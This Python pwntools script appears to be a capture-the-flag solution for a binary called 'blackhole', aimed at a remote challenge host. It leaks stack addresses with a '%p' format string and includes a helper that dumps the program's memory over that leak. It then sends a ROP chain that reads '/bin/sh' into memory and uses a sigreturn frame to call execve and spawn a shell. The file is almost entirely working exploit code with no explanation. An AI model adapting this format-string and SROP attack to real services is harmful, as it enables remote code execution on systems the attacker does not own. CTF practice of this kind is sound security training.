#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# binary = context.binary = ELF('blackhole')
context.arch = 'amd64'

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" blackhole
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]


def exec_fmt(payload):
    p.sendlineafter(b'>> ', payload)
    recd = p.readuntil(b'>')
    return recd

def dump_elf(size=6096):
    global p
    addr = 0x401000-1
    i = 0
    with open("leaked.elf", "wb") as f:
        while i < size:
            try:
                while True:
                    print(f"{i}")
                    f.write(autofmt.leaker.n(addr+i, 8))
                    i += 8
            except:
                print("exection, stopping")
                p.close()
                p = remote('0.cloud.chals.io', 12655)

# p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 8000)
p = remote('0.cloud.chals.io', 12655)
# do leak / payload gen here

payload = b''

a = p.readuntil(b'>>>')
easy_leaks = [int(i, 0) for i in re.findall(b'0x[a-f0-9]+', a)]
[syscall, writable, pop_rax] = easy_leaks

formatstring = b'%p'*20
p.sendline(formatstring)
b = p.readuntil(b'>')
# b = b.split(b': ')[1]
leak_raw = re.search(b'0x[0xa-f0-9]*', b.replace(b'(nil)', b'0x0'))[0]
leaks = [int(i, 16) for i in leak_raw.split(b'0x') if i != b'']
stack_leak = leaks[0]

autofmt = FmtStr(exec_fmt)

addr = 0x401000-1
pop_rdi = addr + 0x00000000000004dc  # : pop rdi; ret;
pop_rsi_r15 = addr + 0x00000000000004da  # : pop rsi; pop r15; ret;
puts = 0x00401030
gets = 0x00401070

s = rop.srop.SigreturnFrame()
s.rax = constants.SYS_execve
s.rdi = writable
s.rsi = 0
s.rdx = 0
s.rip = syscall
s.rsp = stack_leak + 1000

payload = flat({40: [
    # pop_rsi_r15,
    # writable,
    # 0x4141414141414141,
    # pop_rdi,
    # 0,
    # pop_rax,
    # constants.SYS_read,
    # syscall,

    # pop_rdi,
    # 1,
    # pop_rax,
    # constants.SYS_write,
    # syscall,
    pop_rdi,
    writable,
    gets,

    pop_rax,
    constants.SYS_rt_sigreturn,
    syscall,
    bytes(s),
    0x4141414141414141
]})

p.sendline(payload)
time.sleep(2)
p.send(b'/bin/sh\x00' )
time.sleep(2)



# p.send(cyclic(0x200) + b'\n')
# p.interactive()
